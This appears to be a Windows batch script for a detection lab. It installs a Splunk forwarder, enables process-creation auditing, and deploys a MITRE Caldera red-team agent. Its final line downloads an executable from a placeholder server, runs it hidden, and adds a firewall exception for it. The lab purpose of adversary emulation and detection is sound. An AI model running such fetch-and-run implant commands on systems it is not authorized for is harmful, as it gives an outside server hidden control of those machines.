powershell -Command "Invoke-WebRequest -Uri 'https://download.splunk.com/products/universalforwarder/releases/9.4.0/windows/splunkforwarder-9.4.0-6b4ebe426ca6-windows-x64.msi' -OutFile '%USERPROFILE%\Downloads\splunkforwarder.msi'"

REM Install te Universal Forwarder with parameters
msiexec.exe /i "%USERPROFILE%\Downloads\splunkforwarder.msi" RECEIVING_INDEXER="<local machine's IP>:9997" AGREETOLICENSE=YES LAUNCHSPLUNK=1 SERVICESTARTTYPE=auto WINEVENTLOG_APP_ENABLE=1 WINEVENTLOG_SEC_ENABLE=1 WINEVENTLOG_SYS_ENABLE=1 WINEVENTLOG_FWD_ENABLE=1 WINEVENTLOG_SET_ENABLE=1 /quiet

REM Enable Process Command Line Logging in Windows Event Log
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

REM Enable Advanced Audit Policy for Process Creation
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable

REM Allow Caldera agent through windows firewall
powershell -Command "New-NetFirewallRule -DisplayName 'Caldera Agent' -Direction Inbound -Program 'C:\Users\Public\caldera_agent.exe' -Action Allow -Profile Public,Private"

REM Download and start Caldera agent
powershell -Command "$server='http://<local machine's IP>:8888'; $url=$server+'/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $data=$wc.DownloadData($url); Get-Process | Where-Object {$_.modules.filename -like 'C:\Users\Public\caldera_agent.exe'} | Stop-Process -f; Remove-Item -Force 'C:\Users\Public\caldera_agent.exe' -ErrorAction Ignore; [System.IO.File]::WriteAllBytes('C:\Users\Public\caldera_agent.exe',$data); Start-Process -FilePath 'C:\Users\Public\caldera_agent.exe' -ArgumentList '-server', $server, '-group', 'red' -WindowStyle Hidden"